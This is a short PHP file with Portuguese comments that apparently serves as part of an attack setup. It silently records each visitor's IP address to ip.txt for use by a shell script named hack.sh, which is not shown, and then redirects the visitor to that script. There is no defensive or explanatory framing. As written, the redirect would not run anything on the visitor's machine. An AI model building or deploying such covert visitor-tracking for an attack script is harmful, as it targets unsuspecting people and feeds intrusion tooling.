<!-- ip.php -->

<?php

$ip = $_SERVER['REMOTE_ADDR'];

// Escrever o IP em um arquivo para que o script shell possa acessá-lo
$file = 'ip.txt';
file_put_contents($file, $ip);

// Redirecionar para o script shell
header('Location: hack.sh');
exit();
?>
